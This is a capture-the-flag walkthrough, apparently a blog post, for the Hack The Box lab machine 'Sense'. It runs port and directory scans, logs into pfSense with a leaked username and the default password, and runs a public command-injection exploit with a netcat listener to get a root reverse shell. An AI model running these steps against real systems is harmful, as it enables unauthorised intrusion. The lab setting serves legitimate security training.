@@ -1,0 +1,264 @@
+---
+title: Hack The Box - Sense (Without Metasploit)
+date: 2021-01-14 21:44:00 +0800
+categories: [hackthebox]
+tags: [linux, pfsense]
+---
+
+![](/assets/images/sense.png){:height="414px" width="615px"}
+
+# Configuration
+
+The operating system that I will be using to tackle this machine is a Kali Linux VM.
+
+What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
+
+```bash
+$ echo "10.10.10.60 sense.htb" | sudo tee -a /etc/hosts
+```
+
+# Reconnaissance
+
+```bash 
+$ rustscan --accessible -a sense.htb -r 1-65535 -- -sT -sV -sC -Pn       
+File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
+Open 10.10.10.60:80
+Open 10.10.10.60:443
+Starting Script(s)
+Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-14 06:57 UTC
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 06:57
+Completed NSE at 06:57, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 06:57
+Completed Parallel DNS resolution of 1 host. at 06:57, 0.69s elapsed
+DNS resolution of 1 IPs took 0.69s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 06:57
+Scanning 10.10.10.60 [2 ports]
+Discovered open port 443/tcp on 10.10.10.60
+Discovered open port 80/tcp on 10.10.10.60
+Completed Connect Scan at 06:57, 0.01s elapsed (2 total ports)
+Initiating Service scan at 06:57
+Scanning 2 services on 10.10.10.60
+Completed Service scan at 06:58, 12.06s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.10.60.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 06:58
+Completed NSE at 06:58, 0.56s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 06:58
+Completed NSE at 06:58, 0.09s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 06:58
+Completed NSE at 06:58, 0.00s elapsed
+Nmap scan report for 10.10.10.60
+Host is up, received user-set (0.0063s latency).
+Scanned at 2021-01-14 06:57:49 UTC for 13s
+
+PORT    STATE SERVICE  REASON  VERSION
+80/tcp  open  http     syn-ack lighttpd 1.4.35
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Did not follow redirect to https://10.10.10.60/
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+443/tcp open  ssl/http syn-ack lighttpd 1.4.35
+|_http-favicon: Unknown favicon MD5: 082559A7867CF27ACAB7E9867A8B320F
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Login
+| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/organizationalUnitName=Organizational Unit Name (eg, section)/emailAddress=Email Address/localityName=Somecity
+| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/organizationalUnitName=Organizational Unit Name (eg, section)/emailAddress=Email Address/localityName=Somecity
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-10-14T19:21:35
+| Not valid after:  2023-04-06T19:21:35
+| MD5:   65f8 b00f 57d2 3468 2c52 0f44 8110 c622
+| SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02
+| -----BEGIN CERTIFICATE-----
+| MIIEKDCCA5GgAwIBAgIJALChaIpiwz41MA0GCSqGSIb3DQEBCwUAMIG/MQswCQYD
+| VQQGEwJVUzESMBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEU
+| MBIGA1UEChMLQ29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVu
+| aXQgTmFtZSAoZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcs
+| IFlPVVIgbmFtZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3MwHhcNMTcx
+| MDE0MTkyMTM1WhcNMjMwNDA2MTkyMTM1WjCBvzELMAkGA1UEBhMCVVMxEjAQBgNV
+| BAgTCVNvbWV3aGVyZTERMA8GA1UEBxMIU29tZWNpdHkxFDASBgNVBAoTC0NvbXBh
+| bnlOYW1lMS8wLQYDVQQLEyZPcmdhbml6YXRpb25hbCBVbml0IE5hbWUgKGVnLCBz
+| ZWN0aW9uKTEkMCIGA1UEAxMbQ29tbW9uIE5hbWUgKGVnLCBZT1VSIG5hbWUpMRww
+| GgYJKoZIhvcNAQkBFg1FbWFpbCBBZGRyZXNzMIGfMA0GCSqGSIb3DQEBAQUAA4GN
+| ADCBiQKBgQC/sWU6By08lGbvttAfx47SWksgA7FavNrEoW9IRp0W/RF9Fp5BQesL
+| L3FMJ0MHyGcfRhnL5VwDCL0E+1Y05az8PY8kUmjvxSvxQCLn6Mh3nTZkiAJ8vpB0
+| WAnjltrTCEsv7Dnz2OofkpqaUnoNGfO3uKWPvRXl9OlSe/BcDStffQIDAQABo4IB
+| KDCCASQwHQYDVR0OBBYEFDK5DS/hTsi9SHxT749Od/p3Lq05MIH0BgNVHSMEgeww
+| gemAFDK5DS/hTsi9SHxT749Od/p3Lq05oYHFpIHCMIG/MQswCQYDVQQGEwJVUzES
+| MBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEUMBIGA1UEChML
+| Q29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVuaXQgTmFtZSAo
+| ZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcsIFlPVVIgbmFt
+| ZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3OCCQCwoWiKYsM+NTAMBgNV
+| HRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4GBAHNn+1AX2qwJ9zhgN3I4ES1Vq84l
+| n6p7OoBefxcf31Pn3VDnbvJJFFcZdplDxbIWh5lyjpTHRJQyHECtEMW677rFXJAl
+| /cEYWHDndn9Gwaxn7JyffK5lUAPMPEDtudQb3cxrevP/iFZwefi2d5p3jFkDCcGI
+| +Y0tZRIRzHWgQHa/
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 06:58
+Completed NSE at 06:58, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 06:58
+Completed NSE at 06:58, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 06:58
+Completed NSE at 06:58, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
+```
+
+# Enumeration (1)
+
+## Port 80/443 `lighttpd 1.4.35`
+
+When attempting to access the web service via `HTTP`, it automatically redirects us to `HTTPS`. However when using the domain name `sense.htb`, we get an error that tells us to access the web server via IP address. 
+
+![](/assets/images/sense1.png)
+
+When we visit the web server using the `10.10.10.60`, we are presented with a `pfSense` login page.
+
+![](/assets/images/sense2.png)
+
+```bash
+$ gobuster dir -k -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -x .html,.php,.txt,.xml
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            https://10.10.10.60/
+[+] Threads:        100
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php,txt,xml
+[+] Timeout:        10s
+===============================================================
+2021/01/14 03:54:16 Starting gobuster
+===============================================================
+/help.php (Status: 200)
+/index.php (Status: 200)
+/index.html (Status: 200)
+/themes (Status: 301)
+/stats.php (Status: 200)
+/css (Status: 301)
+/includes (Status: 301)
+/edit.php (Status: 200)
+/license.php (Status: 200)
+/system.php (Status: 200)
+/status.php (Status: 200)
+/javascript (Status: 301)
+/changelog.txt (Status: 200)
+/classes (Status: 301)
+/exec.php (Status: 200)
+/widgets (Status: 301)
+/graph.php (Status: 200)
+/tree (Status: 301)
+/wizard.php (Status: 200)
+/shortcuts (Status: 301)
+/pkg.php (Status: 200)
+/installer (Status: 301)
+/wizards (Status: 301)
+/xmlrpc.php (Status: 200)
+/reboot.php (Status: 200)
+/interfaces.php (Status: 200)
+/csrf (Status: 301)
+/system-users.txt (Status: 200)
+/filebrowser (Status: 301)
+/%7echeckout%7e (Status: 403)
+/services_dyndns.php (Status: 200)
+===============================================================
+2021/01/14 04:01:11 Finished
+===============================================================
+```
+
+Directory brute-forcing reveals many interesting files and one file called `system-users.txt` stood out among them.
+
+![](/assets/images/sense3.png)
+
+Could these credentials be the credentials to `pfSense`? Unfortunately, attemping to login with `Rohot:company default` failed. Maybe this `company default` is referring to the default password of `pfSense`?
+
+According to online, the default password is `pfsense`. `Rohit:pfsense` didn't work but `rohit:pfsense` worked!
+
+![](/assets/images/sense4.png)
+
+After logging in, we see that the version of `pfSense` that is running is `2.1.3`. Using `searchsploit`, we see that there are exploits for this version!
+
+```bash
+$ searchsploit pfsense 2.1.3
+--------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                 |  Path
+--------------------------------------------------------------- ---------------------------------
+pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection | php/webapps/43560.py
+--------------------------------------------------------------- ---------------------------------
+```
+
+# Exploitation (1)
+
+After copying it, we need to setup a `nc` listener.
+
+```bash
+$ rlwrap nc -lvnp 1337 
+listening on [any] 1337 ...
+```
+
+And then we run the exploit which will spawn a reverse shell back to our listener.
+
+```bash
+$ python3 43560.py --rhost 10.10.10.60 --lhost 10.10.XX.XX --lport 1337 --username rohit --password pfsense 
+CSRF token obtained
+Running exploit...
+Exploit completed
+```
+
+On our listener, we receive a shell as `root`!
+
+```bash
+$ rlwrap nc -lvnp 1337  
+listening on [any] 1337 ...
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.60] 42989
+sh: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+```
+
+# user.txt
+
+The user flag is located in the home directory of `rohit`.
+
+```bash
+# cat /home/rohit/user.txt
+8721XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
+
+# root.txt
+
+The root flag is located in the home directory of `root`, as usual.
+
+```bash
+# cat /root/root.txt
+d08cXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
+
+
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
